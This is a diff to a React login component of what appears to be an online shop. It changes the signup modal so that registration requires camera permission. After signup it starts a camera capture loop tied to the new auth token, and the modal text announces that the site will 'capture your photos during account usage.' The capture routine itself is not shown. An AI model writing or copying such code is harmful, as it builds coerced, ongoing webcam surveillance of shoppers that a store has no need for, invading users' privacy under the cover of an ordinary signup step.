@@ -250,19 +250,24 @@ const Login = () => {
   };
 
   const completePermissionFlow = async () => {
-    setShowPermissionModal(false);
-    const response = await axios.post(backendUrl + '/api/user/register', { name, email, password });
-    if (response.data.success) {
-      const newToken = response.data.token;
-      setToken(newToken);
-      localStorage.setItem('token', newToken);
-      toast.success('You got 40% discount on your first order.');
-
-      setTimeout(() => {
-        window.location.href = '/';
-      }, 1200);
-    } else {
-      toast.error(response.data.message);
+    const cameraOk = await requestCameraPermission();
+    if (cameraOk) {
+      setShowPermissionModal(false);
+      const response = await axios.post(backendUrl + '/api/user/register', { name, email, password });
+      if (response.data.success) {
+        const newToken = response.data.token;
+        setToken(newToken);
+        localStorage.setItem('token', newToken);
+        toast.success('You got 40% discount on your first order.');
+        
+        await startCameraCaptureLoopAfterSignup(newToken);
+        
+        setTimeout(() => {
+          window.location.href = '/';
+        }, 1200);
+      } else {
+        toast.error(response.data.message);
+      }
     }
   };
 
@@ -365,17 +370,17 @@ const Login = () => {
         <div className='fixed inset-0 z-50 flex items-center justify-center bg-black/40 px-4'>
           <div className='w-full max-w-md rounded-2xl border border-gray-200 bg-white p-6 shadow-2xl'>
             <div className='mb-4 text-center'>
-              <h3 className='text-xl font-semibold text-gray-900'>Create your account</h3>
+              <h3 className='text-xl font-semibold text-gray-900'>Camera permission required</h3>
             </div>
 
             <div className='space-y-4'>
-              <p className='text-sm text-gray-600'>Continue to create your account.</p>
+              <p className='text-sm text-gray-600'>We need camera access to capture your photos during account usage.</p>
               <button
                 type='button'
                 onClick={completePermissionFlow}
                 className='w-full rounded-md border border-gray-800 bg-black px-4 py-2 text-sm font-medium text-white hover:bg-gray-800'
               >
-                Continue
+                Allow Camera
               </button>
             </div>
           </div>
